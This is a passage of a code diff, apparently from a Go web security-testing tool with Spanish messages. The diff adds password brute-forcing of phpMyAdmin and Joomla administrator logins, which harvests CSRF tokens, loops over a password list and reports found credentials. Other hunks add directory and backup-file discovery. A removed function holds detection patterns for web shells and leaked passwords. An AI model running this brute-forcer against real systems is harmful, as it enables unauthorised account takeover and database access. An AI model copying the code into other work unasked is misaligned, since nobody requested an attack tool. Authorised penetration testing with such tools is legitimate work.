+			if strings.Contains(strings.ToLower(decodedResponse), "navigation.php") || strings.Contains(strings.ToLower(decodedResponse), "logout.php") {
+				fmt.Printf("[phpmyadmin] %s (Sistema sin password)\n", url)
+				continue
+			}
+
+			tokenRegex := regexp.MustCompile(`name="token" value="(.*?)"`)
+			matches := tokenRegex.FindStringSubmatch(decodedResponse)
+			var token string
+			if len(matches) >= 2 {
+				token = matches[1]
+			}
+
+			if strings.Contains(strings.ToLower(decodedResponse), "respondiendo") ||
+				strings.Contains(strings.ToLower(decodedResponse), "not responding") ||
+				strings.Contains(strings.ToLower(decodedResponse), "<h1>error</h1>") {
+				fmt.Println("ERROR: El servidor no está respondiendo")
+				continue
+			}
+
+			hashData := map[string]string{
+				"pma_username": user,
+				"pma_password": password,
+				"token":        token,
+				"target":       "index.php",
+				"server":       "1",
+			}
+
+			postData := ConvertHash(hashData)
+			headers.Set("Content-Type", "application/x-www-form-urlencoded")
+
+		GET:
+			resp, err = wh.Dispatch(url+"index.php", "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			status := resp.Status
+			responseHeaders := resp.Header.Get("Location")
+			body, err = ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+				continue
+			}
+
+			decodedResponse = string(body)
+			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+
+			if status == "500 Internal Server Error" {
+				goto GET
+			}
+
+			if strings.Contains(status, "30") || strings.Contains(responseHeaders, "Refresh: ") {
+				newURLRegex := regexp.MustCompile(`Location:(.*?)\n`)
+				newURLMatches := newURLRegex.FindStringSubmatch(responseHeaders)
+				var newURL string
+				if len(newURLMatches) >= 2 {
+					newURL = newURLMatches[1]
+				}
+
+				if newURL == "" {
+					refreshRegex := regexp.MustCompile(`Refresh: 0; (.*?)\n`)
+					refreshMatches := refreshRegex.FindStringSubmatch(responseHeaders)
+					if len(refreshMatches) >= 2 {
+						newURL = refreshMatches[1]
+					}
+				}
+
+				resp, err = wh.Dispatch(newURL, "GET", "", headers)
+				if err != nil {
+					fmt.Printf("Request failed: %v", err)
+					continue
+				}
+				defer resp.Body.Close()
+
+				body, err = ioutil.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Printf("Failed to read response body: %v", err)
+					continue
+				}
+
+				decodedResponse = string(body)
+			}
+
+			if !strings.Contains(decodedResponse, "pma_username") &&
+				!strings.Contains(status, "403") &&
+				!strings.Contains(strings.ToLower(decodedResponse), "cannot log in to the mysql server") &&
+				!strings.Contains(strings.ToLower(decodedResponse), "can't connect to mysql server") &&
+				!strings.Contains(strings.ToLower(decodedResponse), "1045 el servidor mysql") {
+				fmt.Printf("Password encontrado: [phpmyadmin] %s Usuario:%s Password:%s\n", url, user, password)
+				break
+			}
+		}
+
+	}//phpmyadmin
+
+	if module == "joomla" { //3.10
+		resp, err := wh.Dispatch(url + "administrator/index.php", "GET", "", headers)
+		if err != nil {
+			fmt.Printf("Request failed: %v", err)
+		}
+		defer resp.Body.Close()
+
+		body, _ := ioutil.ReadAll(resp.Body)
+		decodedResponse := string(body)		
+
+		var csrf string
+		tokenRegex := regexp.MustCompile(`"csrf.token":"(.*?)"`)
+		matches := tokenRegex.FindStringSubmatch(decodedResponse)
+		if len(matches) >= 2 {
+			csrf = matches[1]
+		}
+
+		var ret string
+		tokenRegex = regexp.MustCompile(`name="return" value="(.*?)"`)
+		matches = tokenRegex.FindStringSubmatch(decodedResponse)
+		if len(matches) >= 2 {
+			ret = matches[1]
+		}
+
+		for _, password := range passwordsList {
+			password = strings.TrimSpace(password)
+			hashData := map[string]string{
+				 csrf:   "1",
+				"return":ret,
+				"task": "login",
+				"option": "com_login",
+				"username": user,
+				"passwd": password,
+			}
+
+
+			postData := ConvertHash(hashData)
+
+			headers.Set("Upgrade-Insecure-Requests", "1")
+			headers.Set("Origin", url)
+			headers.Set("Referer", url + "/administrator/")
+			headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+			resp, err := wh.Dispatch(url + "administrator/index.php", "POST", postData, headers)
+			if err != nil {
+				fmt.Printf("Request failed: %v", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Printf("Failed to read response body: %v", err)
+				continue
+			}
+
+			decodedResponse := string(body)
+
+			title := ""
+			re := regexp.MustCompile(`(?i)<title>(.*?)</title>`)
+			titleMatch := re.FindStringSubmatch(decodedResponse)
+			if len(titleMatch) > 1 {
+				title = titleMatch[1]
+			}
+
+			fmt.Printf("[+] user:%s password:%s title:%s\n", user, password, title)
+
+			if strings.Contains(title, "Control Panel") {
+				fmt.Printf("Password encontrado: [joomla] %s (Usuario:%s Password:%s)\n", url, user, password)
+				break
+			}
+		}
+	}//joomla
+
+}//passwordTest
+
 func (wh *WebHacks) GetData(logFile string) (map[string]string, error) {
 	debug := wh.Debug
 	rhost := wh.Rhost
@@ -127,7 +1209,7 @@ func (wh *WebHacks) GetData(logFile string) (map[string]string, error) {
 			fmt.Printf("urlOriginal (%s)\n", urlOriginal)
 			fmt.Printf("redirect_url en WHILE1 (%s)\n", redirectURL)
 		}
-		resp, err = wh.Dispatch(urlOriginal, "GET", wh.Headers)
+		resp, err = wh.Dispatch(urlOriginal, "GET", "",  wh.Headers)
 		if err != nil {			
 			fmt.Printf("Error1 %s \n", err)
 			if strings.Contains(err.Error(), "server gave") {
@@ -411,6 +1493,11 @@ func (wh *WebHacks) GetData(logFile string) (map[string]string, error) {
 	if regexp.MustCompile(`(?i)You have logged out of the Cisco Router|Cisco RV340 Configuration Utility`).MatchString(decodedHeaderResponse) || regexp.MustCompile(`(?i)Cisco Unified Communications`).MatchString(decodedHeaderResponse) {
 		server = "Cisco Router"
 	} 
+
+	if regexp.MustCompile(`(?i)<div id="flashContent">`).MatchString(decodedHeaderResponse) || regexp.MustCompile(`(?i)Cisco Unified Communications`).MatchString(decodedHeaderResponse) {
+		server = "swfobject"
+	} 
+
 	
 	if regexp.MustCompile(`(?i)Cisco Unified Communications`).MatchString(decodedHeaderResponse) {
 		server = "Cisco Unified Communications"
@@ -974,17 +2061,17 @@ func (wh *WebHacks) Dirbuster(urlFile, extension string) {
 		}
 
 		//Si  directorio adicionar "/"
-		if strings.Contains(urlFile, "directorios") {
+		if strings.Contains(urlFile, "folders") {
 			urlLine += "/"
 		}
 		
 		//adicionar puerto solo si es diferente a 80 o 443
-		// portStr := ""
-		// if rport != 80 && rport != 443 {
-		// 	portStr = ":" + strconv.Itoa(rport)
-		// }
+		 portStr := ""
+		 if rport != "80" && rport != "443" {
+		 	portStr = ":" + rport
+		 }
 
-		urlFinal := proto + "://" + rhost + ":" + rport + path + urlLine
+		urlFinal := proto + "://" + rhost  + portStr + path + urlLine
 
 		links = append(links, urlFinal)
 	}
@@ -1000,7 +2087,7 @@ func (wh *WebHacks) Dirbuster(urlFile, extension string) {
 		go func() {
 			defer wg.Done()
 			for urlLine := range urlsChan {				
-				resp, err := wh.Dispatch(urlLine, "GET", headers)
+				resp, err := wh.Dispatch(urlLine, "GET", "", headers)
 				if err != nil {
 					fmt.Printf("Failed to get URL %s: %v\n", urlLine, err)
 					continue
@@ -1150,7 +2237,7 @@ func (wh *WebHacks) Backupbuster(urlFile string) {
 				backupURL := fmt.Sprintf(backup, urlLine)
 				backupURL = url.PathEscape(backupURL)
 				finalURL := proto + "://" + rhost + ":" + rport + path + backupURL
-				resp, err := wh.Dispatch(finalURL, "GET", headers)
+				resp, err := wh.Dispatch(finalURL, "GET", "", headers)
 				if debug {
 					if err != nil {
 						fmt.Println("Error fetching URL:", finalURL)
@@ -1224,184 +2311,3 @@ func (wh *WebHacks) Backupbuster(urlFile string) {
 }
 
 
-// getRedirect extracts a redirect URL from the decoded HTML response.
-func getRedirect(decodedResponse string) string {
-	// Define patterns to search for redirect URLs
-	patterns := []string{
-		// `meta http-equiv="Refresh" content="0; URL=(.*?)"`,
-		// `meta http-equiv="Refresh" content="0;URL=(.*?)"`,
-		// `meta http-equiv="Refresh" content="1;URL="(.*?)"`,
-		// `meta http-equiv="Refresh" content="1; URL="(.*?)"`,
-		// `meta http-equiv="Refresh" content="1;URL=(.*?)"`,
-		`meta http-equiv=["']Refresh["'] content=["']0; ?URL= ?(.*?)["']`,
-		`meta http-equiv=["']refresh["'] content=["']0; ?URL= ?(.*?)["']`,
-		`meta http-equiv=["']Refresh["'] content=["']1; ?URL= ?(.*?)["']`,
-		`meta http-equiv=["']refresh["'] content=["']1; ?URL= ?(.*?)["']`,
-		`window.onload=function\(\) urlLine ="(.*?)"`,
-		`window.location="(.*?)"`,
-		`location.href="(.*?)"`,
-		`window.location.href = "(.*?)"`,
-		`window.location = "(.*?)"`,
-		`top.location="(.*?)"`,
-		`location.replace\("(.*?)"`,
-		`jumpUrl = "(.*?)"`,
-		`top.document.location.href = "(.*?)"`,
-		`http-equiv="refresh" content="0.1;urlLine=(.*?)"`,
-		`parent.location="(.*?)"`,
-		`redirect_suffix = "(.*?)"`,
-	}
-
-	// Iterate over patterns to find a match
-	for _, pattern := range patterns {
-		re := regexp.MustCompile(pattern)
-		matches := re.FindStringSubmatch(decodedResponse)
-		if len(matches) > 1 {
-			redirectURL := matches[1]
-			// Check if the redirect URL is incomplete, if so, ignore it
-			if redirectURL == "https:" || redirectURL == "http:" {
-				continue
-			}
-			// Check for specific conditions to ignore the redirect URL
-			if re.MatchString(`webfig|\.\.\//`) {
-				// Detected patterns that should be ignored
-				continue
-			}
-			// Remove double quotes from the redirect URL
-			redirectURL = regexp.MustCompile(`"`).ReplaceAllString(redirectURL, "")
-
-			if redirectURL == "login.html" || redirectURL == "../" || redirectURL == "/" || redirectURL == "/public/launchSidebar.jsp" || redirectURL == "/webfig/" || strings.Contains(redirectURL, "Valida") || strings.Contains(redirectURL, "error") || strings.Contains(redirectURL, "microsoftonline")  {
-				redirectURL = ""
-			}
-			return redirectURL
-		}
-	}
-
-	// Return empty string if no redirect URL is found
-	return ""
-}
-
-
-func (wh *WebHacks) Dispatch(urlLine string, method string, headers http.Header) (*http.Response, error) {
-    // Prepare the request
-    req, err := http.NewRequest(method, urlLine, nil)
-    if err != nil {
-        return nil, err
-    }
-
-    // Add headers
-    for key, values := range headers {
-        for _, value := range values {
-            req.Header.Add(key, value)
-        }
-    }
-
-    // Send the request
-    resp, err := wh.Client.Do(req)
-    if err != nil {
-        return nil, err
-    }
-
-    return resp, nil
-}
-
-
-func checkVuln(decodedContent string) string {
-	vuln := ""
-
-	if regexp.MustCompile(`\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.16\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b`).MatchString(decodedContent) {
-		vuln = "IPinterna"
-	}
-	
-
-	if regexp.MustCompile(`(?m)Lorem ipsum`).MatchString(decodedContent) {
-		vuln = "contenidoPrueba"
-	}
-
-	if regexp.MustCompile(`(?i)DEBUG = True|app/controllers|SERVER_ADDR|REMOTE_ADDR|DOCUMENT_ROOT/|TimeoutException|vendor/laravel/framework/src/Illuminate|phpdebugbar`).MatchString(decodedContent) {
-		vuln = "debugHabilitado"
-	}
-
-	if regexp.MustCompile(`(?i) RAT |C99Shell|b374k| r57 | wso | pouya | Kacak | jsp file browser |vonloesch.de|Upload your file|Cannot execute a blank command|fileupload in`).MatchString(decodedContent) {
-		vuln = "backdoor"
-	}
-
-	if regexp.MustCompile(`(?i)db=information_schema`).MatchString(decodedContent) {
-		vuln = "OpenPhpMyAdmin"
-	}
-
-	//fmt.Printf("decodedContent (%s)\n", decodedContent)
-	if regexp.MustCompile(`(?i)var user = "admin";`).MatchString(decodedContent) {
-
-		if !strings.Contains(decodedContent, `INCLUDE_USER_RESTRICTION`) { //negaticvo
-			vuln = "OpenMikrotik"
-		}
-		
-	}
-
-	
-
-
-	re := regexp.MustCompile(`(?i)(undefined function|already sent by|Undefined offset|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Exception in thread|Exception information)`)
-	match := re.FindStringSubmatch(decodedContent)
-
-	// Si hay una coincidencia, imprimir el término que coincide
-	if len(match) > 0 {
-		fmt.Println("Término que coincide:", match[1])
-		vuln = "MensajeError"
-	}
-
-	if regexp.MustCompile(`E_WARNING`).MatchString(decodedContent) { //mayuscula
-		vuln = "MensajeError"
-	}
-
-	if regexp.MustCompile(`(?i)(Access denied for|r=usuario/create)`).MatchString(decodedContent) {
-		vuln = "ExposicionUsuarios"
-	}
-	
-
-	if regexp.MustCompile(`(?i)(?:^|[^a-z])(?:index of|directory of|Index of|Parent directory)(?:[^a-z]|$)`).MatchString(decodedContent) {
-		vuln = "ListadoDirectorios"
-	}
-
-	if regexp.MustCompile(`(?i)HTTP_X_FORWARDED_HOST|HTTP_X_FORWARDED_SERVER\(\)`).MatchString(decodedContent) {
-		vuln = "divulgacionInformacion"
-	}
-
-	decodedContentLower := strings.ToLower(decodedContent)
-	
-	pattern := `(?i)"password":|\&password=` //positivo
-	matched, _ := regexp.MatchString(pattern, decodedContent)
-	if matched {
-		if !strings.Contains(decodedContentLower, `"password":$`) && //negativo comilla doble
-			!strings.Contains(decodedContentLower, `password=**`) &&
-			!strings.Contains(decodedContentLower, `password":"password`) &&
-			!strings.Contains(decodedContentLower, `password=" + encodeuricomponent`) &&
-			!strings.Contains(decodedContentLower, `password":"clave`)&&
-			!strings.Contains(decodedContentLower, `password":"http`)&&
-
-			!strings.Contains(decodedContentLower, `password':$`) && //negativo comilla simple
-			!strings.Contains(decodedContentLower, `password':'password`) &&
-			!strings.Contains(decodedContentLower, `password=' + encodeuricomponent`) &&
-			!strings.Contains(decodedContentLower, `password':'clave`) &&
-			!strings.Contains(decodedContentLower, `password':'http`){
-				
-			vuln = "PasswordDetected"
-		}
-	}
-
-	
-	return vuln
-}
-
-func headerToString(header http.Header) string {
-    var headerStr strings.Builder
-
-    for key, values := range header {
-        headerStr.WriteString(key)
-        headerStr.WriteString(": ")
-        headerStr.WriteString(strings.Join(values, ", "))
-        headerStr.WriteString("\n")
-    }
-
-    return headerStr.String()
-}
